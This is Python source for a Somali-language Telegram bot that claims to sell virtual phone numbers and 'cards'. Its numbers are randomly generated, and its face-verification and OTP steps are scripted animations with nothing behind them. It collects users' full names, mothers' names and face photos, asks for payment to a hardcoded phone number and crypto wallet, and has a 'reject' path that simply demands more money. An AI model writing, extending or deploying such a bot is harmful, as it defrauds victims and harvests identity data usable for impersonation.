import os
import random
import asyncio
import logging
from aiogram import Bot, Dispatcher, F
from aiogram.types import *
from aiogram.filters import Command
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State

# ================= CONFIG =================
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 7983838654
LOCAL_NUMBER = "+252907868526"

bot = Bot(BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())
logging.basicConfig(level=logging.INFO)

users = {}

# ================= STATES =================
class CardState(StatesGroup):
    full_name = State()
    mother = State()
    face_photo = State()
    payment_screenshot = State()

class VirtualPayState(StatesGroup):
    pass

class AskState(StatesGroup):
    message = State()

class CodeState(StatesGroup):
    code = State()

# ================= HELPERS =================
def normal_number():
    return "+25263" + "".join(str(random.randint(0, 9)) for _ in range(7))

def vip_number():
    d = str(random.randint(4, 9))
    return "+25263" + d*3 + str(random.randint(0,9)) + d*3

def generate_code():
    return "".join(random.choices("0123456789", k=6))

def valid_three_name(text):
    return len(text.split()) == 3

async def animate(msg, steps, delay=1):
    for step in steps:
        await asyncio.sleep(delay)
        await msg.edit_text(step)

def payment_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="LOCAL", callback_data="local")],
        [InlineKeyboardButton(text="CRYPTO", callback_data="crypto")]
    ])

# ================= START =================
@dp.message(Command("start"))
async def start(msg: Message):
    kb = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton("New Order"), KeyboardButton("Check Code")]],
        resize_keyboard=True
    )
    await msg.answer("Ku soo dhawoow Service Bot 🤖", reply_markup=kb)

# ================= NEW ORDER =================
@dp.message(F.text == "New Order")
async def new_order(msg: Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="VIRTUAL ($0.8)", callback_data="virtual")],
        [InlineKeyboardButton(text="CARD", callback_data="card")]
    ])
    await msg.answer("Dooro adeeg:", reply_markup=kb)

# ================= VIRTUAL =================
@dp.callback_query(F.data == "virtual")
async def virtual(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="WhatsApp", callback_data="v_WhatsApp")],
        [InlineKeyboardButton(text="TikTok", callback_data="v_TikTok")],
        [InlineKeyboardButton(text="Google", callback_data="v_Google")],
        [InlineKeyboardButton(text="Telegram", callback_data="v_Telegram")]
    ])
    await call.message.edit_text("Dooro Platform:", reply_markup=kb)

@dp.callback_query(F.data.startswith("v_"))
async def virtual_process(call: CallbackQuery):
    uid = call.from_user.id
    platform = call.data.replace("v_", "")
    number = normal_number()

    users[uid] = {
        "type": "virtual",
        "platform": platform,
        "number": number,
        "amount": "$0.8",
        "code": None
    }

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="LOCAL", callback_data="v_local")],
        [InlineKeyboardButton(text="CRYPTO", callback_data="v_crypto")]
    ])

    await call.message.edit_text(
        f"Platform: {platform}\nNumber: {number}\nQiimaha: $0.8\nDooro Payment:",
        reply_markup=kb
    )

# ================= CARD =================
@dp.callback_query(F.data == "card")
async def card_start(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="VIP - $15", callback_data="card_vip")],
        [InlineKeyboardButton(text="NORMAL - $1", callback_data="card_normal")]
    ])
    await call.message.edit_text("Dooro Card Nooca:", reply_markup=kb)

@dp.callback_query(F.data.in_(["card_vip","card_normal"]))
async def card_type(call: CallbackQuery, state: FSMContext):
    uid = call.from_user.id
    level = "VIP" if call.data=="card_vip" else "NORMAL"
    amount = "$15" if level=="VIP" else "$1"
    number = vip_number() if level=="VIP" else normal_number()

    users[uid] = {"type":"card","level":level,"amount":amount,"number":number}
    await call.message.answer("Geli Magacaaga Saddexan:")
    await state.set_state(CardState.full_name)

@dp.message(CardState.full_name)
async def get_full_name(msg: Message, state: FSMContext):
    uid = msg.from_user.id
    if not valid_three_name(msg.text):
        await msg.answer("❌ Magac sax ah geli (3 magac dhab ah)")
        return
    users[uid]["name"] = msg.text.title()
    await msg.answer("Geli Magaca Hooyada Saddexan:")
    await state.set_state(CardState.mother)

@dp.message(CardState.mother)
async def get_mother(msg: Message, state: FSMContext):
    uid = msg.from_user.id
    if not valid_three_name(msg.text):
        await msg.answer("❌ Magaca Hooyada waa inuu noqdaa 3 magac")
        return
    users[uid]["mother"] = msg.text.title()
    await msg.answer("Soo dir Sawirkaaga (Waji muuqda)")
    await state.set_state(CardState.face_photo)

@dp.message(CardState.face_photo, F.photo)
async def get_face(msg: Message, state: FSMContext):
    uid = msg.from_user.id
    check_msg = await msg.answer("Searching.....")
    await animate(check_msg, ["Searching.....","Checking Face.....","Face Verified ✅"])
    users[uid]["face"] = msg.photo[-1].file_id

    await msg.answer(
        f"Number: {users[uid]['number']}\nQiimaha: {users[uid]['amount']}\nDooro Payment Method:",
        reply_markup=payment_keyboard()
    )

# ================= LOCAL & CRYPTO CONFIRM =================
@dp.callback_query(F.data.in_(["local","crypto","v_local","v_crypto"]))
async def payment_confirm(call: CallbackQuery, state: FSMContext):
    uid = call.from_user.id
    data = users[uid]

    if call.data in ["local","v_local"]:
        kb = InlineKeyboardMarkup([[InlineKeyboardButton("CONFIRM", callback_data="confirm_pay")]])
        await call.message.edit_text(f"Ku dir lacagta number-kan:\n{LOCAL_NUMBER}", reply_markup=kb)
    else:
        bnb="0x98ffcb29a4fc182d461ebdba54648d8fe24597ac"
        usdt="0x98ffcb29a4fc182d461ebdba54648d8fe24597ac"
        kb = InlineKeyboardMarkup([[InlineKeyboardButton("CONFIRM", callback_data="confirm_pay")]])
        await call.message.edit_text(f"Send Crypto:\nBNB:`{bnb}`\nUSDT-BEP20:`{usdt}`", reply_markup=kb, parse_mode="Markdown")

@dp.callback_query(F.data=="confirm_pay")
async def confirm_pay(call: CallbackQuery, state: FSMContext):
    uid = call.from_user.id
    await call.message.answer("Soo dir Screenshot Lacag bixintaada:")
    await state.set_state(CardState.payment_screenshot)

@dp.message(CardState.payment_screenshot, F.photo)
async def receive_payment(msg: Message, state: FSMContext):
    uid = msg.from_user.id
    users[uid]["payment"] = msg.photo[-1].file_id
    await msg.answer("Waad mahadsantahay, sug ansixinta Admin. 🚀")
    await state.clear()

    # U dir admin
    data = users[uid]
    kb_admin = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("CONFIRM", callback_data=f"admin_confirm_{uid}")],
        [InlineKeyboardButton("REJECT", callback_data=f"admin_reject_{uid}")],
        [InlineKeyboardButton("ASK", callback_data=f"admin_ask_{uid}")]
    ])
    await bot.send_photo(ADMIN_ID,data["face"],caption=f"📌 CODSI CARD\nUser:{uid}\nLevel:{data.get('level','N/A')}\nNumber:{data['number']}\nName:{data.get('name','N/A')}\nMother:{data.get('mother','N/A')}\nAmount:{data['amount']}",reply_markup=kb_admin)
    await bot.send_photo(ADMIN_ID,data["payment"],caption="💰 Payment Screenshot")

# ================= ADMIN ACTIONS =================
@dp.callback_query(F.data.startswith("admin_confirm_"))
async def admin_confirm(call: CallbackQuery):
    uid=int(call.data.split("_")[2])
    code=generate_code()
    users[uid]["code"]=code
    otp_msg = await bot.send_message(uid,f"OTP.....")
    await animate(otp_msg, ["OTP.....","Generating OTP.....","Verifying.....",f"OTP READY ✅\nCode:{code}"])

    await call.message.edit_text("✅ Approved")

@dp.callback_query(F.data.startswith("admin_reject_"))
async def admin_reject(call: CallbackQuery):
    uid=int(call.data.split("_")[2])
    msg = await bot.send_message(uid,"Checking Payment.....")
    await asyncio.sleep(10)
    await msg.edit_text(f"❌ Fadlan Lacagta soo dir si codsiga loo aqbalo")
    await call.message.edit_text("❌ Rejected")

@dp.callback_query(F.data.startswith("admin_ask_"))
async def admin_ask(call: CallbackQuery, state: FSMContext):
    uid=int(call.data.split("_")[2])
    await state.update_data(target_user=uid)
    await call.message.answer("Qor fariinta aad rabto inaad u dirto user-ka:")
    await state.set_state(AskState.message)

@dp.message(AskState.message)
async def send_admin_message(msg: Message, state: FSMContext):
    data=await state.get_data()
    uid=data.get("target_user")
    if uid:
        await bot.send_message(uid,f"📩 Message from Admin:\n\n{msg.text}")
        await msg.answer("✅ Fariinta waa la diray")
    await state.clear()

# ================= CHECK CODE =================
@dp.callback_query(F.data=="go_check")
async def go_check(call: CallbackQuery, state: FSMContext):
    await call.message.answer("Geli Code-kaaga:")
    await state.set_state(CodeState.code)

@dp.message(F.text=="Check Code")
async def check_code_menu(msg: Message, state: FSMContext):
    await msg.answer("Geli Code-kaaga:")
    await state.set_state(CodeState.code)

@dp.message(CodeState.code)
async def check_code_process(msg: Message, state: FSMContext):
    uid = msg.from_user.id
    code_input = msg.text.strip()
    if uid in users and users[uid].get("code"):
        if users[uid]["code"]==code_input:
            await msg.answer(f"Code Confirmed ✅\nNumber-kaaga waa:\n{users[uid]['number']}")
        else:
            await msg.answer(f"Code Khaldan ❌\n\nNumber:{users[uid]['number']}\nQiimaha:{users[uid]['amount']}",reply_markup=payment_keyboard())
    else:
        await msg.answer("Ma jiro dalab la helay.")
    await state.clear()

# ================= MAIN =================
async def main():
    print("Bot Running 🚀")
    await dp.start_polling(bot)

if __name__=="__main__":
    asyncio.run(main())
